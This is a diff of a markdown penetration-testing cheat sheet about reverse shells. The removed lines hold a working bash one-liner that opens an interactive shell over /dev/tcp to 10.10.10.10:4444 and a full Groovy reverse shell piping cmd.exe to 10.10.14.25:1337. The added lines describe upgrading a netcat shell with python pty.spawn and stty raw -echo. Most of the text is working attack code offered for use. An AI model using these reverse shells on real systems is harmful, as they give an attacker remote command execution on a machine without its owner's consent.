@@ -14,28 +14,22 @@ Using the cheat sheet above, it has different techniques. Check first for the pr
 > For example, to run the `python` one-liner, first make sure we can execute python on the target machine. Might work for `python` and not `python3`, so try all cases.
 
 ----
-##### Bash Script to connect to our machine
 
-> Set the [[IP]] address and [[Port]].
-```
-#!/bin/bash
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
-```
->`script.sh`
+### Upgrade a Reverse Shell
 
-> Make sure the file is executable.
-```shell
-chmod +x script.sh
+Sometimes, we get a shell where the `TAB`, arrow keys, and shortcuts don't work. To upgrade our shell to make it more usable, we can do the following:
+
+1. After connection using `netcat`, run this code in the `netcat` session.
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
----
-##### Groovy script to connect to our machine
-
-``` groovy
-String host="10.10.14.25";
-int port=1337;
-String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+2. Background the `netcat` session by typing `CTRL+Z`.
+3. Connect back the `netcat` session by running:
+```bash
+stty raw -echo; fg
 ```
+
+Now, we have an improved shell.
 
 ---
